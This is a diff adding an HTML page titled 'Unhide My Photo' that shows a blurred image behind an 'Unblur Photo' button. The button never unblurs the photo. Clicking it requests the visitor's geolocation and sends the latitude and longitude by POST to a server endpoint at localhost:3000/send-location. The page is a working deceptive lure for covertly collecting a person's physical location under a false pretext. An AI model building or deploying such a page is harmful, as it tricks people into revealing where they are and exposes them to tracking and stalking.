@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>My Photo</title>
+</head>
+<style>
+.button{
+    display: flex;
+    justify-content: center;
+}
+#getLocationLink{
+    text-decoration: none;
+      color: pink;
+      background: black;
+      padding: 10px;
+      border-radius: 13px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: sans-serif;
+      font-weight: 600;
+      }
+      #getLocationLink:hover{
+        color: rgb(255, 90, 117);
+      }
+      .photo{
+        display: flex;
+        justify-content: center;
+        margin: 35px;
+      }
+      img{
+        height: 20rem;
+        border: 3px solid rgb(152, 16, 243);
+        box-shadow: 0 0 30px yellow;
+        filter: blur(15px);
+      }
+</style>
+<body>
+  <h1>Unhide My Photo</h1>
+  <div class="photo"><img src="pexels-media-5488369-1700283405738.jpeg" alt=""></div>
+  <div class="button">
+  <a href="#" id="getLocationLink">Unblur Photo</a>
+</div>
+
+  <script>
+    document.getElementById('getLocationLink').addEventListener('click', function(event) {
+      event.preventDefault(); // Prevent the default action of the link
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendLocation);
+      } else {
+        alert("Geolocation is not supported by this browser.");
+      }
+    });
+
+    function sendLocation(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+
+      // Send location data to the server
+      fetch('http://localhost:3000/send-location', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ latitude, longitude })
+      })
+      .then(response => response.text())
+      .then(data => alert(data))
+      .catch(error => console.error('Error:', error));
+    }
+  </script>
+</body>
+</html>
